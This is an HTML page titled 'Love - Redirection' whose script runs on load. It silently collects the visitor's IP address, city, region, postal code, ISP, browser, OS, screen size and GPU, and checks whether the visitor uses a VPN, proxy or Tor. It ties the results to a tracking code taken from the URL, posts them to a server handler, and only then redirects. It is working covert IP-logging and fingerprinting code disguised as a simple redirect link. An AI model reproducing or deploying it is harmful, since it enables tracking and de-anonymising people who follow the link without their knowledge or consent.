<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love - Redirection</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }

        .info {
            display: none;
        }
    </style>
</head>
<body>
    <div class="info">
        <div id="ip"></div>
        <div id="hostname"></div>
        <div id="city"></div>
        <div id="region"></div>
        <div id="country"></div>
        <div id="loc"></div>
        <div id="org"></div>
        <div id="postal"></div>
        <div id="timezone"></div>
        <div id="browser"></div>
        <div id="os"></div>
        <div id="screen"></div>
        <div id="gpu"></div>
    </div>
    <script>
document.addEventListener("DOMContentLoaded", async function() {
    try {
        const response = await fetch('https://ipinfo.io?token=3e7f2ddfe8dc7f');
        const data = await response.json();
        const userInfo = {
            ip: data.ip,
            hostname: data.hostname || 'N/A',
            city: data.city,
            region: data.region,
            country: data.country,
            loc: data.loc,
            org: data.org,
            postal: data.postal,
            timezone: data.timezone,
            browser: getBrowserName(),
            os: await getPlatformVersion(),
            screen: `${screen.width}x${screen.height}`,
            gpu: await getGPUInfo()
        };

        const vpnCheckResponse = await fetch('./isnotadirectconnection.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ip: userInfo.ip })
        });
        const vpnCheckData = await vpnCheckResponse.json();

        userInfo.isVPN = vpnCheckData.isVPN;
        userInfo.isProxy = vpnCheckData.isProxy;
        userInfo.isTOR = vpnCheckData.isTOR;

        const urlParams = new URLSearchParams(window.location.search);
        const paramNames = ["id", "ref", "tid", "v", "location", "map", "video", "tag", "identifier", "name", "link", "referer"];
        let code = null;
        for (const name of paramNames) {
            const param = urlParams.get(name);
            if (param) {
                const match = param.match(/^[A-Z0-9]{8}/);
                if (match) {
                    code = match[0];
                    break;
                }
            }
        }

        if (code) {
            userInfo.code = code;
            const userInfoStr = JSON.stringify(userInfo);

            const sendResponse = await fetch('./handler.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: userInfoStr
            });

            if (sendResponse.ok) {
                const responseData = await sendResponse.json();
                if (responseData.redirect_url) {
                    window.location.href = responseData.redirect_url;
                } else {
                    console.error('No redirect URL found in response.');
                }
            } else {
                console.error('Failed to send data to the server.');
            }
        } else {
            console.error("No valid code found in URL parameters.");
        }
    } catch (error) {
        console.error('Error:', error);
    }
});

function getBrowserName() {
    const userAgent = navigator.userAgent;
    if (/Opera|OPR/.test(userAgent)) {
        return 'Opera';
    } else if (/Edg/.test(userAgent)) {
        return 'Microsoft Edge';
    } else if (/Chrome/.test(userAgent)) {
        return navigator.brave && navigator.brave.isBrave ? 'Brave' : 'Google Chrome';
    } else if (/Firefox/.test(userAgent)) {
        return 'Mozilla Firefox';
    } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
        return 'Safari';
    } else {
        return 'Unknown';
    }
}

async function getPlatformVersion() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    let osVersion = "Unknown";

    if (/Windows NT 10\.0/.test(userAgent)) {
        if (navigator.userAgentData) {
            const highEntropyValues = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
            osVersion = parseInt(highEntropyValues.platformVersion.split('.')[0]) >= 10 ? "Windows 11" : "Windows 10";
        } else {
            osVersion = "Windows 10 or 11";
        }
    } else if (/Windows NT 6\.2/.test(userAgent) || /Windows NT 6\.3/.test(userAgent)) {
        osVersion = "Windows 8/8.1";
    } else if (/Windows NT 7\.0/.test(userAgent)) {
        osVersion = "Windows 7";
    } else if (/Mac OS X 10[._]\d+/.test(userAgent)) {
        osVersion = "macOS";
    } else if (/Android/.test(userAgent)) {
        osVersion = "Android";
    } else if (/iPhone|iPad|iPod/.test(userAgent)) {
        osVersion = "iOS";
    } else if (/Linux/.test(platform)) {
        osVersion = /Ubuntu/.test(userAgent) ? "Ubuntu" : /Debian/.test(userAgent) ? "Debian" : "Linux";
    }

    return osVersion;
}

async function getGPUInfo() {
    let canvas = document.createElement('canvas');
    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } else {
            return 'GPU: Not available';
        }
    } else {
        return 'GPU: WebGL not supported';
    }
}
    </script>
</body>
</html>
